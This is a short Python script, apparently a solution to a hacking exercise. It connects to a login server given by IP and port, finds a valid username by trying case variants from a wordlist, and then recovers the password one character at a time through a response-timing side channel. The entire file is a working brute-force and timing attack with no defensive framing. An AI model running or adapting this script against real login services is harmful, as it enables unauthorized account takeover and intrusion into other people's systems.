import sys
import socket
from itertools import product
import json
from string import ascii_letters, digits
import datetime

with open(r"C:\Users\javie\Downloads\logins.txt") as f:
    logins = f.readlines()
logins = [x.strip() for x in logins]

ip_address = sys.argv[1]
port = int(sys.argv[2])

my_socket = socket.socket()
my_socket.connect((ip_address, port))

login = {'login': '', 'password': ' '}

for w in logins:
    stop = False
    w1 = [[character.lower(), character.upper()] for character in w]
    for c in product(*w1):

        login['login'] = ''.join(c)
        json_login = json.dumps(login)

        my_socket.send(json_login.encode())
        response = my_socket.recv(1024)
        response = response.decode('utf-8')
        json_response = json.loads(response)

        if json_response['result'] == 'Wrong password!':
            with open(r"C:\Users\javie\Downloads\login_success.txt", 'a') as f:
                f.write(''.join(c))
            stop = True
            break
        else:
            with open(r"C:\Users\javie\Downloads\login_fail.txt", 'a') as f:
                f.write(''.join(c) + '\n')
    if stop:
        break


all_chr = ascii_letters + digits
password = ''



no_stop = True
while no_stop:
    for chr in all_chr:
        new_pass = password + chr

        login['password'] = new_pass

        json_login = json.dumps(login)
        my_socket.send(json_login.encode())

        time_1 = datetime.datetime.now()
        response = my_socket.recv(1024)
        time_2 = datetime.datetime.now()
        difference = time_2 - time_1

        response = response.decode('utf-8')
        json_response = json.loads(response)

        if difference.total_seconds() >= 0.1:
            password = new_pass
            break
        elif json_response['result'] == "Connection success!":
            print(json.dumps(login))
            no_stop = False
            break

my_socket.close()
